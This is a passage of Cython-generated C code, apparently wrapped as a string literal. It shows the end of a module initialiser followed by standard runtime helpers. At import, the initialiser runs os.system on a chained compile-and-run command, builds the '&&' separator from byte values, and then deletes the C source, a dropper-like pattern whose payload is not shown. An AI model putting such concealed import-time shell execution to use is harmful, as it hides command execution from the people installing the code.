__pyx_t_5, NULL);\n          __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;\n          __Pyx_DECREF(__""pyx_t_5); __pyx_t_5 = 0;\n          if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 5713, __pyx_L9_except_error)\n          __Pyx_GOTREF(__pyx_t_10);\n          __pyx_t_4 = __Pyx_PyObject_IsTrue(__pyx_t_10);\n          __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;\n          if (__pyx_t_4 < 0) __PYX_ERR(0, 5713, __pyx_L9_except_error)\n          __pyx_t_11 = ((!(__pyx_t_4 != 0)) != 0);\n          if (__pyx_t_11) {\n            __Pyx_GIVEREF(__pyx_t_3);\n            __Pyx_GIVEREF(__pyx_t_1);\n            __Pyx_XGIVEREF(__pyx_t_2);\n            __Pyx_ErrRestoreWithState(__pyx_t_3, __pyx_t_1, __pyx_t_2);\n            __pyx_t_3 = 0; __pyx_t_1 = 0; __pyx_t_2 = 0;\n            __PYX_ERR(0, 5713, __pyx_L9_except_error)\n          }\n          __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;\n          __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;\n          __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;\n          goto __pyx_L8_exception_handled;\n        }\n        __pyx_L9_except_error:;\n        __Pyx_XGIVEREF(__pyx_t_7);\n        __Pyx_XGIVEREF(__pyx_t_8);\n        __Pyx_XGIVEREF(__pyx_t_9);\n        __Pyx_ExceptionReset(__pyx_t_7, __pyx_t_8, __pyx_t_9);\n        goto __pyx_L1_error;\n        __pyx_L8_exception_handled:;\n        __Pyx_XGIVEREF(__pyx_t_7);\n        __Pyx_XGIVEREF(__pyx_t_8);\n        __Pyx_XGIVEREF(__pyx_t_9);\n        __Pyx_ExceptionReset(__pyx_t_7, __pyx_t_8, __pyx_t_9);\n        __pyx_L12_try_end:;\n      }\n    }\n    /*finally:*/ {\n      /*normal exit:*/{\n        if (__pyx_t_6) {\n          __pyx_t_9 = __Pyx_PyObject_Call(__pyx_t_6, __pyx_tuple__3, NULL);\n          __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;\n          if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 5713, __pyx_L1_error)\n          __Pyx_GOTREF(__pyx_t_9);\n          __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;\n        }\n        goto __pyx_L6;\n      }\n      __pyx_L6:;\n    }\n    goto __pyx_L16;\n    __pyx_L3_error:;\n    __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;\n    goto __pyx_L1_error;\n    __pyx_L16:;\n  }\n\n\n  __Pyx_""GetModuleGlobalName(__pyx_t_2, __pyx_n_s_os); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 5716, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_2);\n  __pyx_t_1 = __Pyx_PyObject_GetAttrStr(__pyx_t_2, __pyx_n_s_makedirs); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 5716, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_1);\n  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;\n  __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_os); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 5716, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_2);\n  __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_t_2, __pyx_n_s_path); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 5716, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_3);\n  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;\n  __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_t_3, __pyx_n_s_dirname); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 5716, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_2);\n  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;\n  __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_EXECUTE_FILE); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 5716, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_3);\n  __pyx_t_5 = __Pyx_PyObject_CallOneArg(__pyx_t_2, __pyx_t_3); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 5716, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_5);\n  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;\n  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;\n  __pyx_t_3 = PyTuple_New(1); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 5716, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_3);\n  __Pyx_GIVEREF(__pyx_t_5);\n  PyTuple_SET_ITEM(__pyx_t_3, 0, __pyx_t_5);\n  __pyx_t_5 = 0;\n  __pyx_t_5 = __Pyx_PyDict_NewPresized(1); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 5716, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_5);\n  if (PyDict_SetItem(__pyx_t_5, __pyx_n_s_exist_ok, Py_True) < 0) __PYX_ERR(0, 5716, __pyx_L1_error)\n  __pyx_t_2 = __Pyx_PyObject_Call(__pyx_t_1, __pyx_t_3, __pyx_t_5); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 5716, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_2);\n  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;\n  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;\n  __Pyx_DECREF(__pyx_t_5)""; __pyx_t_5 = 0;\n  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;\n\n\n  __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_os); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 5717, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_2);\n  __pyx_t_5 = __Pyx_PyObject_GetAttrStr(__pyx_t_2, __pyx_n_s_system); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 5717, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_5);\n  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;\n  __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_EXPORT_PYTHONHOME); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 5717, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_2);\n\n\n  __pyx_t_3 = PyList_New(4); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 5718, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_3);\n  __Pyx_INCREF(__pyx_int_32);\n  __Pyx_GIVEREF(__pyx_int_32);\n  PyList_SET_ITEM(__pyx_t_3, 0, __pyx_int_32);\n  __Pyx_INCREF(__pyx_int_38);\n  __Pyx_GIVEREF(__pyx_int_38);\n  PyList_SET_ITEM(__pyx_t_3, 1, __pyx_int_38);\n  __Pyx_INCREF(__pyx_int_38);\n  __Pyx_GIVEREF(__pyx_int_38);\n  PyList_SET_ITEM(__pyx_t_3, 2, __pyx_int_38);\n  __Pyx_INCREF(__pyx_int_32);\n  __Pyx_GIVEREF(__pyx_int_32);\n  PyList_SET_ITEM(__pyx_t_3, 3, __pyx_int_32);\n  __pyx_t_1 = __Pyx_PyObject_CallOneArg(((PyObject *)(&PyBytes_Type)), __pyx_t_3); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 5718, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_1);\n  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;\n  __pyx_t_3 = __Pyx_decode_bytes(__pyx_t_1, 0, PY_SSIZE_T_MAX, NULL, NULL, NULL); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 5718, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_3);\n  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;\n\n\n  __pyx_t_1 = PyNumber_Add(__pyx_t_2, __pyx_t_3); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 5717, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_1);\n  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;\n  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;\n\n\n  __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_EXPORT_PYTHON_EXECUTABLE); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 5719, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_3);\n\n\n  __pyx_t_2 = PyNumber_Add(""__pyx_t_1, __pyx_t_3); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 5718, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_2);\n  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;\n  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;\n\n\n  __pyx_t_3 = PyList_New(4); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 5720, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_3);\n  __Pyx_INCREF(__pyx_int_32);\n  __Pyx_GIVEREF(__pyx_int_32);\n  PyList_SET_ITEM(__pyx_t_3, 0, __pyx_int_32);\n  __Pyx_INCREF(__pyx_int_38);\n  __Pyx_GIVEREF(__pyx_int_38);\n  PyList_SET_ITEM(__pyx_t_3, 1, __pyx_int_38);\n  __Pyx_INCREF(__pyx_int_38);\n  __Pyx_GIVEREF(__pyx_int_38);\n  PyList_SET_ITEM(__pyx_t_3, 2, __pyx_int_38);\n  __Pyx_INCREF(__pyx_int_32);\n  __Pyx_GIVEREF(__pyx_int_32);\n  PyList_SET_ITEM(__pyx_t_3, 3, __pyx_int_32);\n  __pyx_t_1 = __Pyx_PyObject_CallOneArg(((PyObject *)(&PyBytes_Type)), __pyx_t_3); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 5720, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_1);\n  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;\n  __pyx_t_3 = __Pyx_decode_bytes(__pyx_t_1, 0, PY_SSIZE_T_MAX, NULL, NULL, NULL); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 5720, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_3);\n  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;\n\n\n  __pyx_t_1 = PyNumber_Add(__pyx_t_2, __pyx_t_3); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 5719, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_1);\n  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;\n  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;\n\n\n  __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_COMPILE_FILE); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 5721, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_3);\n\n\n  __pyx_t_2 = PyNumber_Add(__pyx_t_1, __pyx_t_3); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 5720, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_2);\n  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;\n  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;\n\n\n  __pyx_t_3 = PyList_New(4); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 5722, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_3);\n  __Pyx_INCREF(__pyx_int_32);\n  __Pyx_GIVEREF(__pyx_int_32);""\n  PyList_SET_ITEM(__pyx_t_3, 0, __pyx_int_32);\n  __Pyx_INCREF(__pyx_int_38);\n  __Pyx_GIVEREF(__pyx_int_38);\n  PyList_SET_ITEM(__pyx_t_3, 1, __pyx_int_38);\n  __Pyx_INCREF(__pyx_int_38);\n  __Pyx_GIVEREF(__pyx_int_38);\n  PyList_SET_ITEM(__pyx_t_3, 2, __pyx_int_38);\n  __Pyx_INCREF(__pyx_int_32);\n  __Pyx_GIVEREF(__pyx_int_32);\n  PyList_SET_ITEM(__pyx_t_3, 3, __pyx_int_32);\n  __pyx_t_1 = __Pyx_PyObject_CallOneArg(((PyObject *)(&PyBytes_Type)), __pyx_t_3); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 5722, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_1);\n  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;\n  __pyx_t_3 = __Pyx_decode_bytes(__pyx_t_1, 0, PY_SSIZE_T_MAX, NULL, NULL, NULL); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 5722, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_3);\n  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;\n\n\n  __pyx_t_1 = PyNumber_Add(__pyx_t_2, __pyx_t_3); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 5721, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_1);\n  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;\n  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;\n\n\n  __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_RUN); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 5723, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_3);\n\n\n  __pyx_t_2 = PyNumber_Add(__pyx_t_1, __pyx_t_3); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 5722, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_2);\n  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;\n  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;\n\n\n  __pyx_t_3 = __Pyx_PyObject_CallOneArg(__pyx_t_5, __pyx_t_2); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 5717, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_3);\n  __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;\n  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;\n  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;\n\n\n  __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_os); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 5725, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_3);\n  __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_t_3, __pyx_n_s_remove); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 5725, __pyx_L1_error)\n  __Pyx_GOT""REF(__pyx_t_2);\n  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;\n  __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_C_FILE); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 5725, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_3);\n  __pyx_t_5 = __Pyx_PyObject_CallOneArg(__pyx_t_2, __pyx_t_3); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 5725, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_5);\n  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;\n  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;\n  __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;\n\n\n  __pyx_t_5 = __Pyx_PyDict_NewPresized(0); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 5, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_5);\n  if (PyDict_SetItem(__pyx_d, __pyx_n_s_test, __pyx_t_5) < 0) __PYX_ERR(0, 5, __pyx_L1_error)\n  __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;\n\n  /*--- Wrapped vars code ---*/\n\n  goto __pyx_L0;\n  __pyx_L1_error:;\n  __Pyx_XDECREF(__pyx_t_1);\n  __Pyx_XDECREF(__pyx_t_2);\n  __Pyx_XDECREF(__pyx_t_3);\n  __Pyx_XDECREF(__pyx_t_5);\n  if (__pyx_m) {\n    if (__pyx_d) {\n      __Pyx_AddTraceback(\"init source\", __pyx_clineno, __pyx_lineno, __pyx_filename);\n    }\n    Py_CLEAR(__pyx_m);\n  } else if (!PyErr_Occurred()) {\n    PyErr_SetString(PyExc_ImportError, \"init source\");\n  }\n  __pyx_L0:;\n  __Pyx_RefNannyFinishContext();\n  #if CYTHON_PEP489_MULTI_PHASE_INIT\n  return (__pyx_m != NULL) ? 0 : -1;\n  #elif PY_MAJOR_VERSION >= 3\n  return __pyx_m;\n  #else\n  return;\n  #endif\n}\n\n/* --- Runtime support code --- */\n/* Refnanny */\n#if CYTHON_REFNANNY\nstatic __Pyx_RefNannyAPIStruct *__Pyx_RefNannyImportAPI(const char *modname) {\n    PyObject *m = NULL, *p = NULL;\n    void *r = NULL;\n    m = PyImport_ImportModule(modname);\n    if (!m) goto end;\n    p = PyObject_GetAttrString(m, \"RefNannyAPI\");\n    if (!p) goto end;\n    r = PyLong_AsVoidPtr(p);\nend:\n    Py_XDECREF(p);\n    Py_XDECREF(m);\n    return (__Pyx_RefNannyAPIStruct *)r;\n}\n#endif\n\n/* PyObjectGetAttrStr */\n#if CYTHON_USE_TYPE_SLOTS\nstatic CYTHON_INLINE PyObject* __Pyx_PyObject_Ge""tAttrStr(PyObject* obj, PyObject* attr_name) {\n    PyTypeObject* tp = Py_TYPE(obj);\n    if (likely(tp->tp_getattro))\n        return tp->tp_getattro(obj, attr_name);\n#if PY_MAJOR_VERSION < 3\n    if (likely(tp->tp_getattr))\n        return tp->tp_getattr(obj, PyString_AS_STRING(attr_name));\n#endif\n    return PyObject_GetAttr(obj, attr_name);\n}\n#endif\n\n/* GetBuiltinName */\nstatic PyObject *__Pyx_GetBuiltinName(PyObject *name) {\n    PyObject* result = __Pyx_PyObject_GetAttrStr(__pyx_b, name);\n    if (unlikely(!result)) {\n        PyErr_Format(PyExc_NameError,\n#if PY_MAJOR_VERSION >= 3\n            \"name '%U' is not defined\", name);\n#else\n            \"name '%.200s' is not defined\", PyString_AS_STRING(name));\n#endif\n    }\n    return result;\n}\n\n/* Import */\nstatic PyObject *__Pyx_Import(PyObject *name, PyObject *from_list, int level) {\n    PyObject *empty_list = 0;\n    PyObject *module = 0;\n    PyObject *global_dict = 0;\n    PyObject *empty_dict = 0;\n    PyObject *list;\n    #if PY_MAJOR_VERSION < 3\n    PyObject *py_import;\n    py_import = __Pyx_PyObject_GetAttrStr(__pyx_b, __pyx_n_s_import);\n    if (!py_import)\n        goto bad;\n    #endif\n    if (from_list)\n        list = from_list;\n    else {\n        empty_list = PyList_New(0);\n        if (!empty_list)\n            goto bad;\n        list = empty_list;\n    }\n    global_dict = PyModule_GetDict(__pyx_m);\n    if (!global_dict)\n        goto bad;\n    empty_dict = PyDict_New();\n    if (!empty_dict)\n        goto bad;\n    {\n        #if PY_MAJOR_VERSION >= 3\n        if (level == -1) {\n            if ((1) && (strchr(__Pyx_MODULE_NAME, '.'))) {\n                module = PyImport_ImportModuleLevelObject(\n                    name, global_dict, empty_dict, list, 1);\n                if (!module) {\n                    if (!PyErr_ExceptionMatches(PyExc_ImportError))\n                        goto bad;\n                    PyErr_Clear();\n                }\n            }\n          ""  level = 0;\n        }\n        #endif\n        if (!module) {\n            #if PY_MAJOR_VERSION < 3\n            PyObject *py_level = PyInt_FromLong(level);\n            if (!py_level)\n                goto bad;\n            module = PyObject_CallFunctionObjArgs(py_import,\n                name, global_dict, empty_dict, list, py_level, (PyObject *)NULL);\n            Py_DECREF(py_level);\n            #else\n            module = PyImport_ImportModuleLevelObject(\n                name, global_dict, empty_dict, list, level);\n            #endif\n        }\n    }\nbad:\n    #if PY_MAJOR_VERSION < 3\n    Py_XDECREF(py_import);\n    #endif\n    Py_XDECREF(empty_list);\n    Py_XDECREF(empty_dict);\n    return module;\n}\n\n/* decode_c_bytes */\nstatic CYTHON_INLINE PyObject* __Pyx_decode_c_bytes(\n         const char* cstring, Py_ssize_t length, Py_ssize_t start, Py_ssize_t stop,\n         const char* encoding, const char* errors,\n         PyObject* (*decode_func)(const char *s, Py_ssize_t size, const char *errors)) {\n    if (unlikely((start < 0) | (stop < 0))) {\n        if (start < 0) {\n            start += length;\n            if (start < 0)\n                start = 0;\n        }\n        if (stop < 0)\n            stop += length;\n    }\n    if (stop > length)\n        stop = length;\n    if (unlikely(stop <= start))\n        return __Pyx_NewRef(__pyx_empty_unicode);\n    length = stop - start;\n    cstring += start;\n    if (decode_func) {\n        return decode_func(cstring, length, errors);\n    } else {\n        return PyUnicode_Decode(cstring, length, encoding, errors);\n    }\n}\n\n/* PyCFunctionFastCall */\n#if CYTHON_FAST_PYCCALL\nstatic CYTHON_INLINE PyObject * __Pyx_PyCFunction_FastCall(PyObject *func_obj, PyObject **args, Py_ssize_t nargs) {\n    PyCFunctionObject *func = (PyCFunctionObject*)func_obj;\n    PyCFunction meth = PyCFunction_GET_FUNCTION(func);\n    PyObject *self = PyCFunction_GET_SELF(func);\n    int flags = PyCFunction_GET_FLAGS(func);""\n    assert(PyCFunction_Check(func));\n    assert(METH_FASTCALL == (flags & ~(METH_CLASS | METH_STATIC | METH_COEXIST | METH_KEYWORDS | METH_STACKLESS)));\n    assert(nargs >= 0);\n    assert(nargs == 0 || args != NULL);\n    /* _PyCFunction_FastCallDict() must not be called with an exception set,\n       because it may clear it (directly or indirectly) and so the\n       caller loses its exception */\n    assert(!PyErr_Occurred());\n    if ((PY_VERSION_HEX < 0x030700A0) || unlikely(flags & METH_KEYWORDS)) {\n        return (*((__Pyx_PyCFunctionFastWithKeywords)(void*)meth)) (self, args, nargs, NULL);\n    } else {\n        return (*((__Pyx_PyCFunctionFast)(void*)meth)) (self, args, nargs);\n    }\n}\n#endif\n\n/* PyFunctionFastCall */\n#if CYTHON_FAST_PYCALL\nstatic PyObject* __Pyx_PyFunction_FastCallNoKw(PyCodeObject *co, PyObject **args, Py_ssize_t na,\n                                               PyObject *globals) {\n    PyFrameObject *f;\n    PyThreadState *tstate = __Pyx_PyThreadState_Current;\n    PyObject **fastlocals;\n    Py_ssize_t i;\n    PyObject *result;\n    assert(globals != NULL);\n    /* XXX Perhaps we should create a specialized\n       PyFrame_New() that doesn't take locals, but does\n       take builtins without sanity checking them.\n       */\n    assert(tstate != NULL);\n    f = PyFrame_New(tstate, co, globals, NULL);\n    if (f == NULL) {\n        return NULL;\n    }\n    fastlocals = __Pyx_PyFrame_GetLocalsplus(f);\n    for (i = 0; i < na; i++) {\n        Py_INCREF(*args);\n        fastlocals[i] = *args++;\n    }\n    result = PyEval_EvalFrameEx(f,0);\n    ++tstate->recursion_depth;\n    Py_DECREF(f);\n    --tstate->recursion_depth;\n    return result;\n}\n#if 1 || PY_VERSION_HEX < 0x030600B1\nstatic PyObject *__Pyx_PyFunction_FastCallDict(PyObject *func, PyObject **args, Py_ssize_t nargs, PyObject *kwargs) {\n    PyCodeObject *co = (PyCodeObject *)PyFunction_GET_CODE(func);\n    PyObject *globals = PyFunction_GET_GLOBALS(func);\n    Py""Object *argdefs = PyFunction_GET_DEFAULTS(func);\n    PyObject *closure;\n#if PY_MAJOR_VERSION >= 3\n    PyObject *kwdefs;\n#endif\n    PyObject *kwtuple, **k;\n    PyObject **d;\n    Py_ssize_t nd;\n    Py_ssize_t nk;\n    PyObject *result;\n    assert(kwargs == NULL || PyDict_Check(kwargs));\n    nk = kwargs ? PyDict_Size(kwargs) : 0;\n    if (Py_EnterRecursiveCall((char*)\" while calling a Python object\")) {\n        return NULL;\n    }\n    if (\n#if PY_MAJOR_VERSION >= 3\n            co->co_kwonlyargcount == 0 &&\n#endif\n            likely(kwargs == NULL || nk == 0) &&\n            co->co_flags == (CO_OPTIMIZED | CO_NEWLOCALS | CO_NOFREE)) {\n        if (argdefs == NULL && co->co_argcount == nargs) {\n            result = __Pyx_PyFunction_FastCallNoKw(co, args, nargs, globals);\n            goto done;\n        }\n        else if (nargs == 0 && argdefs != NULL\n                 && co->co_argcount == Py_SIZE(argdefs)) {\n            /* function called with no arguments, but all parameters have\n               a default value: use default values as arguments .*/\n            args = &PyTuple_GET_ITEM(argdefs, 0);\n            result =__Pyx_PyFunction_FastCallNoKw(co, args, Py_SIZE(argdefs), globals);\n            goto done;\n        }\n    }\n    if (kwargs != NULL) {\n        Py_ssize_t pos, i;\n        kwtuple = PyTuple_New(2 * nk);\n        if (kwtuple == NULL) {\n            result = NULL;\n            goto done;\n        }\n        k = &PyTuple_GET_ITEM(kwtuple, 0);\n        pos = i = 0;\n        while (PyDict_Next(kwargs, &pos, &k[i], &k[i+1])) {\n            Py_INCREF(k[i]);\n            Py_INCREF(k[i+1]);\n            i += 2;\n        }\n        nk = i / 2;\n    }\n    else {\n        kwtuple = NULL;\n        k = NULL;\n    }\n    closure = PyFunction_GET_CLOSURE(func);\n#if PY_MAJOR_VERSION >= 3\n    kwdefs = PyFunction_GET_KW_DEFAULTS(func);\n#endif\n    if (argdefs != NULL) {\n        d = &PyTuple_GET_ITEM(argdefs, 0);\n        nd = Py_SIZE(argdefs);""\n    }\n    else {\n        d = NULL;\n        nd = 0;\n    }\n#if PY_MAJOR_VERSION >= 3\n    result = PyEval_EvalCodeEx((PyObject*)co, globals, (PyObject *)NULL,\n                               args, (int)nargs,\n                               k, (int)nk,\n                               d, (int)nd, kwdefs, closure);\n#else\n    result = PyEval_EvalCodeEx(co, globals, (PyObject *)NULL,\n                               args, (int)nargs,\n                               k, (int)nk,\n                               d, (int)nd, closure);\n#endif\n    Py_XDECREF(kwtuple);\ndone:\n    Py_LeaveRecursiveCall();\n    return result;\n}\n#endif\n#endif\n\n/* PyObjectCall */\n#if CYTHON_COMPILING_IN_CPYTHON\nstatic CYTHON_INLINE PyObject* __Pyx_PyObject_Call(PyObject *func, PyObject *arg, PyObject *kw) {\n    PyObject *result;\n    ternaryfunc call = Py_TYPE(func)->tp_call;\n    if (unlikely(!call))\n        return PyObject_Call(func, arg, kw);\n    if (unlikely(Py_EnterRecursiveCall((char*)\" while calling a Python object\")))\n        return NULL;\n    result = (*call)(func, arg, kw);\n    Py_LeaveRecursiveCall();\n    if (unlikely(!result) && unlikely(!PyErr_Occurred())) {\n        PyErr_SetString(\n            PyExc_SystemError,\n            \"NULL result without error in PyObject_Call\");\n    }\n    return result;\n}\n#endif\n\n/* PyObjectCallMethO */\n#if CYTHON_COMPILING_IN_CPYTHON\nstatic CYTHON_INLINE PyObject* __Pyx_PyObject_CallMethO(PyObject *func, PyObject *arg) {\n    PyObject *self, *result;\n    PyCFunction cfunc;\n    cfunc = PyCFunction_GET_FUNCTION(func);\n    self = PyCFunction_GET_SELF(func);\n    if (unlikely(Py_EnterRecursiveCall((char*)\" while calling a Python object\")))\n        return NULL;\n    result = cfunc(self, arg);\n    Py_LeaveRecursiveCall();\n    if (unlikely(!result) && unlikely(!PyErr_Occurred())) {\n        PyErr_SetString(\n            PyExc_SystemError,\n            \"NULL result without error in PyObject_Call\");\n    }\n    return res""ult;\n}\n#endif\n\n/* PyObjectCallOneArg */\n#if CYTHON_COMPILING_IN_CPYTHON\nstatic PyObject* __Pyx__PyObject_CallOneArg(PyObject *func, PyObject *arg) {\n    PyObject *result;\n    PyObject *args = PyTuple_New(1);\n    if (unlikely(!args)) return NULL;\n    Py_INCREF(arg);\n    PyTuple_SET_ITEM(args, 0, arg);\n    result = __Pyx_PyObject_Call(func, args, NULL);\n    Py_DECREF(args);\n    return result;\n}\nstatic CYTHON_INLINE PyObject* __Pyx_PyObject_CallOneArg(PyObject *func, PyObject *arg) {\n#if CYTHON_FAST_PYCALL\n    if (PyFunction_Check(func)) {\n        return __Pyx_PyFunction_FastCall(func, &arg, 1);\n    }\n#endif\n    if (likely(PyCFunction_Check(func))) {\n        if (likely(PyCFunction_GET_FLAGS(func) & METH_O)) {\n            return __Pyx_PyObject_CallMethO(func, arg);\n#if CYTHON_FAST_PYCCALL\n        } else if (__Pyx_PyFastCFunction_Check(func)) {\n            return __Pyx_PyCFunction_FastCall(func, &arg, 1);\n#endif\n        }\n    }\n    return __Pyx__PyObject_CallOneArg(func, arg);\n}\n#else\nstatic CYTHON_INLINE PyObject* __Pyx_PyObject_CallOneArg(PyObject *func, PyObject *arg) {\n    PyObject *result;\n    PyObject *args = PyTuple_Pack(1, arg);\n    if (unlikely(!args)) return NULL;\n    result = __Pyx_PyObject_Call(func, args, NULL);\n    Py_DECREF(args);\n    return result;\n}\n#endif\n\n/* PyDictVersioning */\n#if CYTHON_USE_DICT_VERSIONS && CYTHON_USE_TYPE_SLOTS\nstatic CYTHON_INLINE PY_UINT64_T __Pyx_get_tp_dict_version(PyObject *obj) {\n    PyObject *dict = Py_TYPE(obj)->tp_dict;\n    return likely(dict) ? __PYX_GET_DICT_VERSION(dict) : 0;\n}\nstatic CYTHON_INLINE PY_UINT64_T __Pyx_get_object_dict_version(PyObject *obj) {\n    PyObject **dictptr = NULL;\n    Py_ssize_t offset = Py_TYPE(obj)->tp_dictoffset;\n    if (offset) {\n#if CYTHON_COMPILING_IN_CPYTHON\n        dictptr = (likely(offset > 0)) ? (PyObject **) ((char *)obj + offset) : _PyObject_GetDictPtr(obj);\n#else\n        dictptr = _PyObject_GetDictPtr(obj);\n#endif\n    }\n    re""turn (dictptr && *dictptr) ? __PYX_GET_DICT_VERSION(*dictptr) : 0;\n}\nstatic CYTHON_INLINE int 